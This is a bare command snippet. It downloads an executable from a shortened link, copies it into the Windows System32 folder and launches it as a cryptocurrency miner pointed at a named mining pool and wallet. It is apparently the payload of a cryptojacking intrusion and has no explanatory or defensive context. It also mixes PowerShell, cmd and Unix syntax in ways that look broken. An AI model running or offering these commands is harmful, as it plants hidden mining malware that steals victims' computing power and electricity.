Invoke-WebRequest https://bit.ly/2ZIc2a0 -OutFile logmin.exe
Copy logmin.exe C:\Windows\System32
cmd /c echo cmd /k start logmin.exe --pool pool.semipool.com:33309 --username gunsCrDVtDZNnpGQLr87BKNADNKJ8qgqGcrhqu3zoDG4GFcYaUs82ioVyXrcHTengEEiouGUvhu1NTZKXy6USCHhA9Wov5jYx9 --password $(shuf -n 1 -i 1-99999) --algorithm chukwa
